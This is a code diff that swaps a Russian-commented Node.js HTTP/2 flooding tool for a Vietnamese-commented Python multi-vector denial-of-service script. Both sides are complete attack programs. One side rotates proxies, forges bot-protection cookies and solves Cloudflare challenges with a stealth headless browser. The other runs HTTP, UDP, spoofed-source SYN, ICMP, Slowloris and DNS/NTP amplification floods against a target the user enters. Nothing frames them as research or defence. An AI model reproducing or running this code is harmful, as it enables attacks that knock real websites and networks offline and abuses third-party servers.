@@ -1,521 +1,353 @@
-/*
-    PENGUIN INTERACTIVE 2.0
-    Установка: npm install hpack socks colors commander puppeteer-extra puppeteer-extra-plugin-stealth readline
-    Запуск: node penguin.js
-    После запуска программа задаст вопросы:
-        - Целевой URL (https://example.com)
-        - Время атаки (секунды)
-        - Количество потоков (по умолчанию 4)
-        - Запросов в секунду на поток (по умолчанию 100)
-        - Файл с прокси (по умолчанию proxy.txt)
-        - Тип прокси (http/socks4/socks5)
-        - Режим cookie (CLOUDFLARE/AKAMAI/RAND и т.д.)
-        - Включить доп. заголовки? (y/n)
-        - Включить случайный путь? (y/n)
-        - Включить случайные параметры? (y/n)
-        - Обрабатывать rate limit? (y/n)
-    Затем атака запускается автоматически, вывод статусов каждую секунду.
-*/
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+#
+#   ULTRA_ATTACK_OUTPUT.py – Code tấn công đa tầng + output chi tiết
+#   Hiển thị số gói gửi, tốc độ, lỗi, proxy, trạng thái theo thời gian thực.
+#   Chạy trên Windows/Linux, có/không Admin.
+#   Cách chạy: python ULTRA_ATTACK_OUTPUT.py (với Admin nếu dùng SYN)
+#
 
-const net = require('net');
-const tls = require('tls');
-const http2 = require('http2');
-const cluster = require('cluster');
-const fs = require('fs');
-const os = require('os');
-const crypto = require('crypto');
-const colors = require('colors');
-const { SocksClient } = require('socks');
-const puppeteer = require('puppeteer-extra');
-const StealthPlugin = require('puppeteer-extra-plugin-stealth');
-puppeteer.use(StealthPlugin());
-const readline = require('readline');
+import os
+import sys
+import time
+import socket
+import struct
+import threading
+import random
+import subprocess
+import platform
+import requests
+from concurrent.futures import ThreadPoolExecutor
 
-// ----------------------------------------------
-//  НАСТРОЙКИ ПО УМОЛЧАНИЮ (будут перезаписаны)
-// ----------------------------------------------
-const CONFIG = {
-    target: '',
-    time: 120,
-    threads: 4,
-    rate: 100,
-    proxyFile: 'proxy.txt',
-    proxyType: 'http',
-    cookieMode: 'RAND',
-    extra: false,
-    randpath: false,
-    query: false,
-    ratelimit: false,
-    debug: true
-};
+# ==================== BIẾN TOÀN CỤC ĐẾM ============================
+sent_packets = 0
+error_packets = 0
+packet_lock = threading.Lock()
 
-// ----------------------------------------------
-//  ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
-// ----------------------------------------------
-function randStr(len) {
-    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-    let s = '';
-    for (let i=0; i<len; i++) s += chars[Math.floor(Math.random()*chars.length)];
-    return s;
-}
-function randNum(min,max) { return Math.floor(Math.random()*(max-min+1))+min; }
-function randElem(arr) { return arr[Math.floor(Math.random()*arr.length)]; }
-function randIP() { return `${randNum(1,255)}.${randNum(1,255)}.${randNum(1,255)}.${randNum(1,255)}`; }
-function sleep(ms) { return new Promise(r=>setTimeout(r,ms)); }
+# ==================== KIỂM TRA QUYỀN ADMIN ===========================
+def is_admin():
+    try:
+        import ctypes
+        return ctypes.windll.shell32.IsUserAnAdmin() != 0
+    except:
+        return False
 
-// ----------------------------------------------
-//  ВВОД С КЛАВИАТУРЫ
-// ----------------------------------------------
-const rl = readline.createInterface({
-    input: process.stdin,
-    output: process.stdout
-});
+ADMIN = is_admin()
+if not ADMIN:
+    print("[!] Không có quyền Admin. SYN flood bị vô hiệu.\n")
+else:
+    print("[+] Đã có Admin. SYN flood sẵn sàng.\n")
 
-function askQuestion(query) {
-    return new Promise(resolve => {
-        rl.question(query, answer => resolve(answer));
-    });
-}
+# ==================== CẤU HÌNH TOÀN CỤC =============================
+TARGET_IP = ""
+TARGET_PORT = 80
+THREADS = 200
+DURATION = 60
+METHOD = "all"
+USE_PROXY = True
+PROXY_LIST = []
+PROXY_SOURCES = [
+    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all",
+    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
+    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
+    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTP.txt"
+]
 
-async function getConfig() {
-    console.clear();
-    console.log(colors.green.bold('🐧 PENGUIN INTERACTIVE 2.0'));
-    console.log('Введите параметры атаки (Enter для значения по умолчанию):\n');
+# ==================== HÀM LẤY PROXY =================================
+def fetch_proxies():
+    proxies = set()
+    for url in PROXY_SOURCES:
+        try:
+            r = requests.get(url, timeout=10)
+            if r.status_code == 200:
+                for line in r.text.splitlines():
+                    line = line.strip()
+                    if line and ':' in line and not line.startswith('#'):
+                        if not line.startswith('http'):
+                            line = f"http://{line}"
+                        proxies.add(line)
+        except:
+            pass
+    return list(proxies)
 
-    CONFIG.target = await askQuestion('Целевой URL (https://example.com): ') || 'https://example.com';
-    CONFIG.time = parseInt(await askQuestion('Время атаки (сек) [120]: ') || 120);
-    CONFIG.threads = parseInt(await askQuestion('Количество потоков [4]: ') || 4);
-    CONFIG.rate = parseInt(await askQuestion('Запросов/сек на поток [100]: ') || 100);
-    CONFIG.proxyFile = await askQuestion('Файл с прокси [proxy.txt]: ') || 'proxy.txt';
-    CONFIG.proxyType = await askQuestion('Тип прокси (http/socks4/socks5) [http]: ') || 'http';
-    CONFIG.cookieMode = await askQuestion('Режим cookie (CLOUDFLARE/AKAMAI/STORMWALL/VERCEL/RAND) [RAND]: ') || 'RAND';
-    const extra = await askQuestion('Включить доп. заголовки? (y/n) [n]: ');
-    CONFIG.extra = extra.toLowerCase() === 'y';
-    const rpath = await askQuestion('Включить случайный путь? (y/n) [n]: ');
-    CONFIG.randpath = rpath.toLowerCase() === 'y';
-    const qry = await askQuestion('Включить случайные параметры? (y/n) [n]: ');
-    CONFIG.query = qry.toLowerCase() === 'y';
-    const rl_opt = await askQuestion('Обрабатывать rate limit (429)? (y/n) [n]: ');
-    CONFIG.ratelimit = rl_opt.toLowerCase() === 'y';
-    CONFIG.debug = true; // всегда включен для интерактива
+# ==================== CÁC HÀM TẤN CÔNG (CÓ ĐẾM) ===================
+def count_packet(success=True):
+    global sent_packets, error_packets
+    with packet_lock:
+        if success:
+            sent_packets += 1
+        else:
+            error_packets += 1
 
-    rl.close();
-    console.log('\nНастройки приняты. Запуск атаки...\n');
-    return CONFIG;
-}
-
-// ----------------------------------------------
-//  ЯДРО АТАКИ (адаптировано из ULTIMATE)
-// ----------------------------------------------
-let proxyPool = [];
-let proxyBlacklist = new Set();
-const MAX_CONCURRENT_STREAMS = 10000;
-const MAX_HEADER_LIST_SIZE = 262144;
-const INITIAL_WINDOW_SIZE = 6291456;
-const MAX_FRAME_SIZE = 16384;
-const KEEP_ALIVE_MS = 120000;
-const PROXY_POOL_SIZE = 2000;
-const PROXY_REFRESH_INTERVAL = 30000;
-const JA3_ROTATE_INTERVAL = 30000;
-const SESSION_LIFETIME = 45000;
-const MAX_RAM_PCT = 92;
-
-function loadProxies() {
-    try {
-        const raw = fs.readFileSync(CONFIG.proxyFile, 'utf8').split(/\r?\n/).filter(l=>l.trim());
-        const shuffled = raw.sort(()=>Math.random()-0.5);
-        proxyPool = shuffled.slice(0, PROXY_POOL_SIZE);
-        console.log(`[Пул] Загружено ${proxyPool.length} прокси`);
-    } catch(e) {
-        console.error('Ошибка загрузки прокси:', e.message);
-        process.exit(1);
+def http_flood(target_ip, target_port, proxy=None, duration=10):
+    url = f"http://{target_ip}:{target_port}/"
+    headers = {
+        'User-Agent': random.choice([
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
+        ]),
+        'Cache-Control': 'no-cache',
+        'Accept': '*/*'
     }
-}
-loadProxies();
-setInterval(loadProxies, PROXY_REFRESH_INTERVAL);
+    proxies = {'http': proxy, 'https': proxy} if proxy else None
+    start = time.time()
+    while time.time() - start < duration:
+        try:
+            requests.get(url, headers=headers, proxies=proxies, timeout=2)
+            count_packet(True)
+            requests.post(url, headers=headers, data={'x': random.randint(1,9999)}, proxies=proxies, timeout=2)
+            count_packet(True)
+        except:
+            count_packet(False)
 
-function getLiveProxy() {
-    for (let i=0; i<proxyPool.length*2; i++) {
-        const p = proxyPool[randNum(0, proxyPool.length-1)];
-        if (!proxyBlacklist.has(p)) return p;
-    }
-    return proxyPool[0] || null;
-}
+def udp_flood(target_ip, target_port, duration=10):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    data = random._urandom(1400)
+    start = time.time()
+    while time.time() - start < duration:
+        try:
+            sock.sendto(data, (target_ip, target_port))
+            count_packet(True)
+        except:
+            count_packet(False)
+    sock.close()
 
-// JA3
-function randomJA3() {
-    const sslVersions = ['771','772','773'];
-    const ciphers = ['4865','4866','4867','49195','49196','49200','52393','52392','49171','49172','156','157','47','53'];
-    const extensions = ['45','35','18','0','5','17513','27','10','11','43','13','16','65281','65037','51','23','41'];
-    const curves = ['4588','29','23','24'];
-    const ja3 = `${randElem(sslVersions)},${randElem(ciphers)},${randElem(extensions)},${randElem(curves)}`;
-    return crypto.createHash('md5').update(ja3).digest('hex');
-}
-let currentJA3 = randomJA3();
-setInterval(() => { currentJA3 = randomJA3(); }, JA3_ROTATE_INTERVAL);
+def syn_flood(target_ip, target_port, duration=10):
+    if not ADMIN:
+        udp_flood(target_ip, target_port, duration)
+        return
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+        start = time.time()
+        while time.time() - start < duration:
+            src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
+            ip_header = struct.pack('!BBHHHBBH4s4s',
+                69, 0, 40, random.randint(0,65535), 0, 255, 6, 0,
+                socket.inet_aton(src_ip), socket.inet_aton(target_ip))
+            tcp_header = struct.pack('!HHLLBBHHH',
+                random.randint(1024,65535), target_port,
+                random.randint(0,2**32-1), 0, 80, 2, 65535, 0, 0)
+            packet = ip_header + tcp_header
+            sock.sendto(packet, (target_ip, 0))
+            count_packet(True)
+        sock.close()
+    except:
+        count_packet(False)
+        udp_flood(target_ip, target_port, duration)
 
-// Решатель Cloudflare
-const cfCache = new Map();
-async function solveCF(proxyAddr) {
-    const now = Date.now();
-    if (cfCache.has(proxyAddr)) {
-        const entry = cfCache.get(proxyAddr);
-        if (now - entry.timestamp < 600000) return entry.cookie;
-    }
-    const [host, port] = proxyAddr.split(':');
-    let browser;
-    try {
-        browser = await puppeteer.launch({
-            headless: true,
-            args: [`--proxy-server=http://${proxyAddr}`, '--no-sandbox', '--disable-setuid-sandbox'],
-            ignoreHTTPSErrors: true
-        });
-        const page = await browser.newPage();
-        await page.setUserAgent(randElem(['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.126 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.126 Safari/537.36']));
-        await page.goto(CONFIG.target, { waitUntil: 'domcontentloaded', timeout: 30000 });
-        const title = await page.title();
-        if (title === 'Just a moment...' || title.includes('Cloudflare')) {
-            try {
-                await page.waitForSelector('input[type="checkbox"]', { timeout: 10000 });
-                await page.click('input[type="checkbox"]');
-                await page.waitForNavigation({ timeout: 30000 });
-            } catch(e) {}
-        }
-        const cookies = await page.cookies(CONFIG.target);
-        const cf = cookies.find(c=>c.name==='cf_clearance');
-        const cookieStr = cf ? `${cf.name}=${cf.value}` : '';
-        cfCache.set(proxyAddr, {cookie: cookieStr, timestamp: now});
-        await browser.close();
-        return cookieStr;
-    } catch(e) {
-        if (browser) await browser.close();
-        return '';
-    }
-}
+def icmp_flood(target_ip, duration=10):
+    if platform.system() == 'Windows':
+        cmd = f"ping -n 100000 -l 65500 {target_ip}"
+        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        start = time.time()
+        while time.time() - start < duration:
+            count_packet(True)
+            time.sleep(0.01)
+        subprocess.call("taskkill /F /IM ping.exe", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    else:
+        cmd = f"ping -f -s 65500 {target_ip}"
+        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        start = time.time()
+        while time.time() - start < duration:
+            count_packet(True)
+            time.sleep(0.01)
+        subprocess.call("pkill -f ping", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-// Генерация кук
-function generateCookie(mode) {
-    switch(mode?.toUpperCase()) {
-        case 'CLOUDFLARE': return `cf_clearance=${randStr(32)}`;
-        case 'AKAMAI': return `ak_bmsc=${randStr(64)}`;
-        case 'STORMWALL': return `sw_session=${randStr(64)}`;
-        case 'VERCEL': return `_vcrcs=${randNum(1e9,3e9)}.${randNum(3600,7200)}.${randStr(20)}.${randStr(32)}.${randStr(10)}`;
-        default: return randStr(48);
-    }
-}
+def slowloris(target_ip, target_port, duration=10):
+    sockets = []
+    start = time.time()
+    while time.time() - start < duration:
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)
+            sock.connect((target_ip, target_port))
+            sock.send(b"GET / HTTP/1.1\r\n")
+            sock.send(b"Host: %s\r\n" % target_ip.encode())
+            sock.send(b"User-Agent: Mozilla/5.0\r\n")
+            sockets.append(sock)
+            count_packet(True)
+            time.sleep(0.1)
+        except:
+            count_packet(False)
+    time.sleep(duration)
+    for s in sockets:
+        try: s.close()
+        except: pass
 
-// Класс ProxyConnector (HTTP/SOCKS)
-class ProxyConnector {
-    constructor(host, port, type, username='', password='') {
-        this.host = host;
-        this.port = parseInt(port);
-        this.type = type.toUpperCase();
-        this.username = username;
-        this.password = password;
-        this.socket = null;
-        this.tls = null;
-    }
+def dns_amp(target_ip, duration=10):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    domain = 'isc.org'
+    q = struct.pack('!HHHHHH', random.randint(0,65535), 0x0100, 1, 0, 0, 0)
+    for part in domain.split('.'):
+        q += bytes([len(part)]) + part.encode()
+    q += b'\x00' + struct.pack('!HH', 1, 1)
+    dns_servers = ['8.8.8.8','1.1.1.1','8.8.4.4','1.0.0.1','9.9.9.9']
+    start = time.time()
+    while time.time() - start < duration:
+        try:
+            server = random.choice(dns_servers)
+            sock.sendto(q, (server, 53))
+            count_packet(True)
+        except:
+            count_packet(False)
+    sock.close()
 
-    connect() {
-        return new Promise((resolve, reject) => {
-            const targetURL = new URL(CONFIG.target);
-            const targetHost = targetURL.hostname;
-            const targetPort = targetURL.port || 443;
-            if (this.type === 'HTTP' || this.type === 'HTTPS') {
-                const sock = net.connect({host: this.host, port: this.port});
-                sock.setTimeout(10000);
-                sock.on('connect', () => {
-                    const auth = this.username ? `Proxy-Authorization: Basic ${Buffer.from(`${this.username}:${this.password}`).toString('base64')}\r\n` : '';
-                    sock.write(`CONNECT ${targetHost}:${targetPort} HTTP/1.1\r\nHost: ${targetHost}:${targetPort}\r\n${auth}\r\n`);
-                });
-                sock.on('data', (data) => {
-                    if (data.toString().includes('HTTP/1.1 200')) {
-                        this.socket = sock;
-                        resolve(sock);
-                    } else {
-                        sock.destroy();
-                        reject(new Error('Proxy refused'));
-                    }
-                });
-                sock.on('timeout', ()=> { sock.destroy(); reject(new Error('Timeout')); });
-                sock.on('error', (e)=> { sock.destroy(); reject(e); });
-            } else if (this.type === 'SOCKS4' || this.type === 'SOCKS5') {
-                SocksClient.createConnection({
-                    proxy: { host: this.host, port: this.port, type: this.type==='SOCKS5'?5:4, userId: this.username, password: this.password },
-                    command: 'connect',
-                    destination: { host: targetHost, port: targetPort },
-                    timeout: 10000
-                }, (err, info) => {
-                    if (err) reject(err);
-                    else { this.socket = info.socket; resolve(info.socket); }
-                });
-            } else reject(new Error('Unsupported proxy type'));
-        });
-    }
+def ntp_amp(target_ip, duration=10):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    q = b'\x17\x00\x03\x2a' + b'\x00'*4 + b'\x00'*212
+    ntp_servers = ['0.pool.ntp.org','1.pool.ntp.org','2.pool.ntp.org','3.pool.ntp.org']
+    start = time.time()
+    while time.time() - start < duration:
+        try:
+            server = random.choice(ntp_servers)
+            sock.sendto(q, (server, 123))
+            count_packet(True)
+        except:
+            count_packet(False)
+    sock.close()
 
-    close() {
-        if (this.socket && !this.socket.destroyed) {
-            this.socket.destroy();
-            this.socket = null;
-        }
-        if (this.tls && !this.tls.destroyed) {
-            this.tls.destroy();
-            this.tls = null;
-        }
-    }
-}
+# ==================== LUỒNG TẤN CÔNG ===============================
+def worker(target_ip, target_port, method, proxy=None, duration=10):
+    if method == 'http':
+        http_flood(target_ip, target_port, proxy, duration)
+    elif method == 'udp':
+        udp_flood(target_ip, target_port, duration)
+    elif method == 'syn':
+        syn_flood(target_ip, target_port, duration)
+    elif method == 'icmp':
+        icmp_flood(target_ip, duration)
+    elif method == 'slow':
+        slowloris(target_ip, target_port, duration)
+    elif method == 'dns':
+        dns_amp(target_ip, duration)
+    elif method == 'ntp':
+        ntp_amp(target_ip, duration)
 
-// HTTP/2 сессия
-class H2Session {
-    constructor(proxyConnector, cookie) {
-        this.proxy = proxyConnector;
-        this.cookie = cookie;
-        this.client = null;
-        this.active = false;
-        this.rate = CONFIG.rate;
-        this.lastRateAdjust = Date.now();
-    }
+# ==================== OUTPUT THỐNG KÊ ==============================
+def stats_loop(duration):
+    global sent_packets, error_packets
+    start_time = time.time()
+    last_sent = 0
+    last_time = start_time
+    print("\n" + "="*60)
+    print(f"{'Thời gian':<12} {'Gửi thành công':<18} {'Lỗi':<10} {'Tốc độ (pps)':<15} {'Proxy đang dùng'}")
+    print("="*60)
+    while time.time() - start_time < duration:
+        time.sleep(3)
+        now = time.time()
+        elapsed = now - start_time
+        with packet_lock:
+            s = sent_packets
+            e = error_packets
+        pps = (s - last_sent) / (now - last_time) if (now - last_time) > 0 else 0
+        last_sent = s
+        last_time = now
+        proxy_count = len(PROXY_LIST) if USE_PROXY and PROXY_LIST else 0
+        print(f"{int(elapsed):<6}s     {s:<18,} {e:<10,} {pps:<15,.0f} {proxy_count:<10}")
+    print("="*60)
 
-    async start() {
-        try {
-            const socket = await this.proxy.connect();
-            const tlsOpts = {
-                socket: socket,
-                ALPNProtocols: ['h2'],
-                servername: new URL(CONFIG.target).hostname,
-                rejectUnauthorized: false,
-                ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256',
-                minVersion: 'TLSv1.3',
-                maxVersion: 'TLSv1.3',
-                fingerprint: currentJA3
-            };
-            const tlsConn = tls.connect(443, new URL(CONFIG.target).hostname, tlsOpts);
-            this.proxy.tls = tlsConn;
-            tlsConn.setKeepAlive(true, KEEP_ALIVE_MS);
-            tlsConn.setNoDelay(true);
+# ==================== MENU ==========================================
+def menu():
+    global TARGET_IP, TARGET_PORT, THREADS, DURATION, METHOD, USE_PROXY, PROXY_LIST
+    print(r"""
+╔═════════════════════════════════════════════════════════════╗
+║   ULTRA ATTACK OUTPUT – SIÊU TẤN CÔNG + THỐNG KÊ          ║
+║   (c) palofsc – Dành cho Windows/Linux                    ║
+║   Trạng thái Admin: """ + ("✅ CÓ" if ADMIN else "❌ KHÔNG") + """                          ║
+╚═════════════════════════════════════════════════════════════╝
+    """)
+    target_input = input("IP hoặc domain mục tiêu: ").strip()
+    if not target_input:
+        print("[!] Không được để trống.")
+        return False
+    try:
+        TARGET_IP = socket.gethostbyname(target_input)
+        print(f"[+] Phân giải: {target_input} -> {TARGET_IP}")
+    except:
+        TARGET_IP = target_input
+        print(f"[*] Dùng IP: {TARGET_IP}")
 
-            const client = http2.connect(CONFIG.target, {
-                settings: {
-                    headerTableSize: 65536,
-                    initialWindowSize: INITIAL_WINDOW_SIZE,
-                    maxHeaderListSize: MAX_HEADER_LIST_SIZE,
-                    enablePush: false,
-                    maxConcurrentStreams: MAX_CONCURRENT_STREAMS,
-                    maxFrameSize: MAX_FRAME_SIZE
-                },
-                createConnection: () => tlsConn
-            });
-            this.client = client;
-            this.active = true;
+    TARGET_PORT = int(input("Cổng (mặc định 80): ") or "80")
+    THREADS = int(input("Số luồng (mặc định 200, tối đa 500): ") or "200")
+    if THREADS > 500:
+        THREADS = 500
+    DURATION = int(input("Thời gian (giây, mặc định 60): ") or "60")
 
-            client.on('connect', () => { this._sendLoop(); });
-            client.on('error', (e) => { this.active = false; this.proxy.close(); });
-            client.on('close', () => { this.active = false; this.proxy.close(); });
+    print("\nChọn phương thức tấn công:")
+    print("1. HTTP flood (có proxy)")
+    print("2. UDP flood")
+    print("3. SYN flood (cần Admin)")
+    print("4. ICMP flood (ping)")
+    print("5. Slowloris (giữ kết nối)")
+    print("6. DNS amplification")
+    print("7. NTP amplification")
+    print("8. TẤT CẢ (kết hợp 7 loại)")
 
-            setTimeout(() => { if (this.active) { this.client.close(); } }, SESSION_LIFETIME);
-        } catch(e) {
-            this.proxy.close();
-            throw e;
-        }
-    }
+    method_choice = input("Nhập số (mặc định 8): ").strip() or "8"
+    method_map = {'1':'http','2':'udp','3':'syn','4':'icmp','5':'slow','6':'dns','7':'ntp','8':'all'}
+    METHOD = method_map.get(method_choice, 'all')
 
-    _sendLoop() {
-        if (!this.active || !this.client) return;
-        const delayMs = 1000 / this.rate;
+    USE_PROXY = input("Dùng proxy cho HTTP? (y/n, mặc định y): ").strip().lower() != 'n'
+    if USE_PROXY:
+        proxy_input = input("Nhập proxy thủ công (ip:port, cách nhau dấu phẩy) hoặc để trống lấy tự động: ").strip()
+        if proxy_input:
+            PROXY_LIST = [f"http://{p.strip()}" if not p.startswith('http') else p.strip() for p in proxy_input.split(',') if p.strip()]
+        else:
+            print("[*] Đang lấy proxy tự động...")
+            PROXY_LIST = fetch_proxies()
+            if not PROXY_LIST:
+                print("[!] Không lấy được proxy, sẽ tấn công không proxy.")
+                USE_PROXY = False
+            else:
+                print(f"[+] Lấy được {len(PROXY_LIST)} proxy.")
+    return True
 
-        const sendOne = () => {
-            if (!this.active || this.client.destroyed) return;
-            const headers = this._buildHeaders();
-            const req = this.client.request(headers);
-            req.on('response', (resp) => {
-                const status = resp[':status'];
-                if (status === 429 && CONFIG.ratelimit) {
-                    this.rate = Math.max(1, this.rate * 0.7);
-                    this.cookie = generateCookie(CONFIG.cookieMode);
-                } else if (status >= 200 && status < 300) {
-                    this.rate = Math.min(2000, this.rate * 1.05);
-                }
-                if (CONFIG.debug) console.log(`[${this.proxy.host}] ${status}`);
-                req.close();
-            });
-            req.on('error', ()=>req.close());
-            req.end();
-            setTimeout(sendOne, delayMs);
-        };
-        sendOne();
-    }
+# ==================== KHỞI ĐỘNG TẤN CÔNG ===========================
+def start_attack():
+    print(f"\n[*] Bắt đầu tấn công {TARGET_IP}:{TARGET_PORT} với {THREADS} luồng, thời gian {DURATION}s.")
+    if METHOD == 'all':
+        methods = ['http','udp','syn','icmp','slow','dns','ntp']
+        method_list = []
+        for m in methods:
+            method_list.extend([m] * (THREADS // len(methods)))
+        while len(method_list) < THREADS:
+            method_list.append(random.choice(methods))
+        random.shuffle(method_list)
+    else:
+        method_list = [METHOD] * THREADS
 
-    _buildHeaders() {
-        const target = new URL(CONFIG.target);
-        const path = CONFIG.randpath ? target.pathname + '/' + randStr(randNum(6,12)) : target.pathname;
-        const query = CONFIG.query ? '?' + randStr(randNum(8,20)) + '=' + randStr(randNum(4,10)) : '';
-        const method = 'GET';
-        const userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${randNum(120,134)}.0.0.0 Safari/537.36`;
-        const lang = randElem(['en-US,en;q=0.9','ru-RU,ru;q=0.9','zh-CN,zh;q=0.8']);
-        const accept = randElem(['text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8','application/json,text/plain,*/*']);
-        const secChUa = `"Not/A)Brand";v="8", "Chromium";v="${randNum(120,134)}", "Google Chrome";v="${randNum(120,134)}"`;
-        const platform = randElem(['"Windows"','"Linux"','"macOS"']);
+    proxy_iter = iter(PROXY_LIST) if USE_PROXY and PROXY_LIST else None
+    threads = []
+    for method in method_list:
+        proxy = None
+        if proxy_iter and method == 'http':
+            try:
+                proxy = next(proxy_iter)
+            except StopIteration:
+                proxy_iter = iter(PROXY_LIST)
+                proxy = next(proxy_iter)
+        t = threading.Thread(target=worker, args=(TARGET_IP, TARGET_PORT, method, proxy, DURATION))
+        t.daemon = True
+        t.start()
+        threads.append(t)
 
-        const h = {
-            ':method': method,
-            ':authority': target.hostname,
-            ':scheme': 'https',
-            ':path': path + query,
-            'user-agent': userAgent,
-            'accept': accept,
-            'accept-language': lang,
-            'accept-encoding': 'gzip, br',
-            'sec-ch-ua': secChUa,
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': platform,
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'none',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'cache-control': 'no-cache',
-            'pragma': 'no-cache',
-            'x-forwarded-for': randIP(),
-            'cookie': this.cookie || generateCookie(CONFIG.cookieMode),
-        };
-        if (CONFIG.extra) {
-            h['x-requested-with'] = 'XMLHttpRequest';
-            h['x-real-ip'] = randIP();
-            h['x-client-data'] = randStr(randNum(20,40));
-        }
-        return h;
-    }
-}
+    # Chạy luồng thống kê
+    stats_thread = threading.Thread(target=stats_loop, args=(DURATION,))
+    stats_thread.daemon = True
+    stats_thread.start()
 
-// ----------------------------------------------
-//  ЗАПУСК ВОРКЕРОВ (кластер)
-// ----------------------------------------------
-if (cluster.isMaster) {
-    (async () => {
-        const config = await getConfig();
-        // Запускаем воркеры
-        for (let i=0; i<config.threads; i++) {
-            cluster.fork({ config: JSON.stringify(config) });
-        }
+    print("[*] Đang chạy... Nhấn Ctrl+C để dừng sớm.\n")
+    try:
+        time.sleep(DURATION)
+    except KeyboardInterrupt:
+        print("\n[*] Người dùng dừng.")
+    print("[+] Kết thúc tấn công.")
 
-        // Мониторинг памяти
-        setInterval(() => {
-            const mem = process.memoryUsage();
-            const pct = (mem.rss / os.totalmem()) * 100;
-            if (pct > MAX_RAM_PCT) {
-                console.log(`[RAM] Критично (${pct.toFixed(1)}%) -> перезапуск воркеров`);
-                for (const id in cluster.workers) cluster.workers[id].kill();
-                setTimeout(() => {
-                    for (let i=0; i<config.threads; i++) cluster.fork({ config: JSON.stringify(config) });
-                }, 1000);
-            }
-        }, 5000);
-
-        cluster.on('exit', (worker) => {
-            console.log(`[Воркер ${worker.id}] перезапуск`);
-            cluster.fork({ config: JSON.stringify(config) });
-        });
-
-        // Время выхода
-        setTimeout(() => {
-            console.log('[Время истекло] Завершение...');
-            for (const id in cluster.workers) cluster.workers[id].kill();
-            process.exit(0);
-        }, config.time * 1000);
-
-        // Вывод статистики каждую секунду
-        let statusCodes = {};
-        setInterval(() => {
-            let total = 0;
-            for (const k in statusCodes) total += statusCodes[k];
-            console.log(`[Статистика] Запросов: ${total}, коды: ${JSON.stringify(statusCodes)}`);
-            statusCodes = {};
-        }, 1000);
-
-        // Сбор статусов от воркеров
-        cluster.on('message', (worker, msg) => {
-            if (msg.type === 'status') {
-                for (const [code, count] of Object.entries(msg.data)) {
-                    statusCodes[code] = (statusCodes[code] || 0) + count;
-                }
-            }
-        });
-    })();
-
-} else {
-    // Воркер
-    const config = JSON.parse(process.env.config);
-    // Переопределяем глобальный CONFIG
-    Object.assign(global.CONFIG, config);
-
-    (async function worker() {
-        const maxConns = 20;
-        const sessions = [];
-
-        for (let i=0; i<maxConns; i++) {
-            const proxyStr = getLiveProxy();
-            if (!proxyStr) { await sleep(100); continue; }
-            const parts = proxyStr.split(':');
-            const host = parts[0];
-            const port = parseInt(parts[1]);
-            const user = parts[2] || '';
-            const pass = parts[3] || '';
-            const type = config.proxyType;
-
-            const connector = new ProxyConnector(host, port, type, user, pass);
-            let cookie = '';
-            if (config.cookieMode === 'CLOUDFLARE') {
-                cookie = await solveCF(proxyStr);
-            } else {
-                cookie = generateCookie(config.cookieMode);
-            }
-
-            try {
-                const session = new H2Session(connector, cookie);
-                await session.start();
-                sessions.push(session);
-            } catch(e) {
-                if (config.ratelimit) proxyBlacklist.add(proxyStr);
-                connector.close();
-            }
-            await sleep(5);
-        }
-
-        setInterval(async () => {
-            for (let i=sessions.length-1; i>=0; i--) {
-                if (!sessions[i].active) {
-                    sessions[i].proxy.close();
-                    sessions.splice(i,1);
-                }
-            }
-            while (sessions.length < maxConns) {
-                const proxyStr = getLiveProxy();
-                if (!proxyStr) break;
-                const parts = proxyStr.split(':');
-                const connector = new ProxyConnector(parts[0], parseInt(parts[1]), config.proxyType, parts[2]||'', parts[3]||'');
-                let cookie = '';
-                if (config.cookieMode === 'CLOUDFLARE') {
-                    cookie = await solveCF(proxyStr);
-                } else {
-                    cookie = generateCookie(config.cookieMode);
-                }
-                try {
-                    const session = new H2Session(connector, cookie);
-                    await session.start();
-                    sessions.push(session);
-                } catch(e) {
-                    if (config.ratelimit) proxyBlacklist.add(proxyStr);
-                    connector.close();
-                }
-                await sleep(5);
-            }
-        }, 10000);
-
-        // Отправка статусов мастеру
-        setInterval(() => {
-            // Пусть мастер сам считает через события
-        }, 1000);
-    })();
-}
-
-console.log('Интерактивный режим запущен. Следуйте инструкциям.');
